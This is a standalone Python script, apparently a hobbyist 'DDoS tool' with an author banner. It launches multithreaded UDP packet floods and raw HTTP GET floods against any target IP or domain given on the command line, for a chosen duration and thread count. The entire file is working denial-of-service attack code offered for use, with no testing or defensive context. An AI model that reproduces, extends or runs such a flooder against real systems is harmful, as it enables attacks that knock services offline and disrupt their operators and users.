#!/usr/bin/env python3
import socket
import threading
import time
import random
import sys
import os
from argparse import ArgumentParser

class KsohmkDDoS:
    def __init__(self):
        self.attack_running = False
        self.threads = []
        self.payload = random._urandom(16)
        
    def banner(self):
        print("""
        ╔═══════════════════════════════════════╗
        ║     KSOHMK DDOS TOOL - v1.0          ║
        ║     Author: Team Ans|src                   ║
        ║     Usage: ./ksohmk_ddos.py          ║
        ╚═══════════════════════════════════════╝
        """)
    
    def attack(self, target_ip, target_port, duration):
        self.attack_running = True
        timeout = time.time() + duration
        
        while time.time() < timeout and self.attack_running:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.settimeout(1)
                s.sendto(self.payload, (target_ip, target_port))
                s.close()
            except:
                pass
    
    def http_flood(self, target_url, duration):
        self.attack_running = True
        timeout = time.time() + duration
        
        while time.time() < timeout and self.attack_running:
            try:
                headers = {
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
                    'Accept': '*/*',
                    'Connection': 'keep-alive'
                }
                
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(2)
                s.connect((target_url, 80))
                
                request = f"GET / HTTP/1.1\r\nHost: {target_url}\r\n"
                for header, value in headers.items():
                    request += f"{header}: {value}\r\n"
                request += "\r\n"
                
                s.send(request.encode())
                s.close()
            except:
                pass
    
    def stop_attack(self):
        self.attack_running = False
        for thread in self.threads:
            thread.join()
        self.threads = []
        print("\n[!] Attack stopped")
    
    def run(self):
        self.banner()
        
        parser = ArgumentParser(description="KSOHMK DDOS Tool")
        parser.add_argument("-t", "--target", help="Target IP or domain", required=True)
        parser.add_argument("-p", "--port", type=int, help="Target port (for UDP flood)", default=80)
        parser.add_argument("-d", "--duration", type=int, help="Attack duration in seconds", default=60)
        parser.add_argument("-th", "--threads", type=int, help="Number of threads", default=100)
        parser.add_argument("--http", action="store_true", help="Use HTTP flood instead of UDP")
        
        args = parser.parse_args()
        
        target = args.target
        port = args.port
        duration = args.duration
        threads = args.threads
        http_mode = args.http
        
        print(f"[+] Target: {target}")
        print(f"[+] Port: {port}")
        print(f"[+] Duration: {duration} seconds")
        print(f"[+] Threads: {threads}")
        print(f"[+] Mode: {'HTTP Flood' if http_mode else 'UDP Flood'}")
        
        try:
            if http_mode:
                target_ip = socket.gethostbyname(target)
                print(f"[+] Resolved {target} to {target_ip}")
                target = target_ip
            
            print("\n[!] Starting attack... Press Ctrl+C to stop")
            
            for i in range(threads):
                if http_mode:
                    thread = threading.Thread(target=self.http_flood, args=(target, duration))
                else:
                    thread = threading.Thread(target=self.attack, args=(target, port, duration))
                thread.daemon = True
                thread.start()
                self.threads.append(thread)
            
            try:
                while self.attack_running:
                    time.sleep(1)
            except KeyboardInterrupt:
                self.stop_attack()
                
        except Exception as e:
            print(f"[!] Error: {str(e)}")
            sys.exit(1)

if __name__ == "__main__":
    if os.name == "nt":
        print("[!] This tool is designed for Linux/Termux only")
        sys.exit(1)
    
    tool = KsohmkDDoS()
    tool.run()